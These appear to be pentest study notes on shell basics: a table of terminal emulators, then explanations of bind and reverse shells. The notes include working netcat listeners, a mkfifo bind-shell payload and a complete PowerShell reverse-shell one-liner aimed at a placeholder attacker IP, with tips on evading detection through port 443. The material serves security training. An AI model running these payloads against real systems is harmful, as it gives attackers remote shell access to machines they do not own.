# Shell Basics

## Anatomy of a Shell

| **Terminal Emulator**                                          | **Operating System**     |
| -------------------------------------------------------------- | ------------------------ |
| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |
| [cmder](https://cmder.app)                                     | Windows                  |
| [PuTTY](https://www.putty.org)                                 | Windows                  |
| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |
| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |
| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |
| [Konsole](https://konsole.kde.org)                             | Linux                    |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_\(macOS\))   | MacOS                    |
| [iTerm2](https://iterm2.com)                                   | MacOS                    |

A `command language interpreter` is a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing

The $ sign is used in Bash, Ksh, POSIX, and many other shell languages to mark the start of the `shell prompt` where the user can begin typing commands and other input

Validate your shell version by using `ps` or `env`

## Bind Shells

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box)

<figure><img src="https://academy.hackthebox.com/storage/modules/115/bindshell.png" alt=""><figcaption></figcaption></figure>

There can be many challenges associated with getting a shell this way. Here are some to consider:

* There would have to be a listener already started on the target
* If there is no listener started, we would need to find a way to make this happen
* Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already
* Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications

`Netcat` (`nc`) is considered our `Swiss-Army Knife` since it can function over TCP, UDP, and Unix sockets. It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output. We would use nc on the attack box as our `client`, and the target would be the `server`&#x20;

```bash
# Once connected to the box with ssh, start a Netcat listener
nc -lvnp 7777

# On our box, connect to the listener
nc -nv <ip> 7777
```

### Establish a Basic Bind Shell with Netcat

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served

```bash
# Example of a manual payload to establish a bind shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip> 7777 > /tmp/f
```

## Reverse Shells

With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection

<figure><img src="https://academy.hackthebox.com/storage/modules/115/reverseshell.png" alt=""><figcaption></figcaption></figure>

We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected

There are helpful tools that infosec veterans have put together to assist us. [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement

This example involves establishing a simple reverse shell using some PowerShell code on a Windows target

```bash
# On attack box. 443 is common, so an outbound 443 request will be overlooked
sudo nc -lvnp 443
```

Netcat can be used to initiate the reverse shell on the Windows side, but we must be mindful of what applications are present on the system already. Netcat is not native to Windows systems, so it may be unreliable to count on using it as our tool on the Windows side. We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start

```bash
# On target 
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attackIP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
